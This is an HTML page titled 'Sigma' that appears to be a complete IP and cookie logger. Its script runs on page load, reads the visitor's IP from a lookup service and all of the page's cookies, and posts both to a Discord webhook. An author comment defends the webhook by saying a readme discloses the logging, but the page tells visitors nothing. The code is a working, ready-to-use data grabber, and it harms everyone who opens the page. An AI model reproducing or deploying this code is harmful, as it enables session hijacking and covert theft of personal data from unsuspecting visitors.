<!DOCTYPE html>
<html>
<head>
    <title>Sigma</title>
</head>
<body>
    <script>
        // Function to get the user's IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return null;
            }
        }

        // Function to get all cookies
        function getCookies() {
            return document.cookie;
        }


        async function sendDataToDiscord(ip, cookies) {
            // dont take the webhook down i legit have a read me that says that this is a logger ppl do know :skull: 
            const webhookURL = 'e18aa4cb495b18938576122de4980fc91e94f00a196ce42f88cf0a0a7c7e4e7f';
            const message = {
                content: `User IP: ${ip}\nCookies: ${cookies}`
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
                if (response.ok) {
                    console.log('Data sent to Discord successfully');
                } else {
                    console.error('Error sending data to Discord:', response.statusText);
                }
            } catch (error) {
                console.error('Error sending data to Discord:', error);
            }
        }

        // Main function to execute the steps
        async function logUserData() {
            const userIP = await getUserIP();
            const cookies = getCookies();
            if (userIP) {
                await sendDataToDiscord(userIP, cookies);
            } else {
                console.error('Could not retrieve user IP');
            }
        }

        // Execute the function when the page loads
        window.onload = logUserData;
    </script>
</body>
</html>
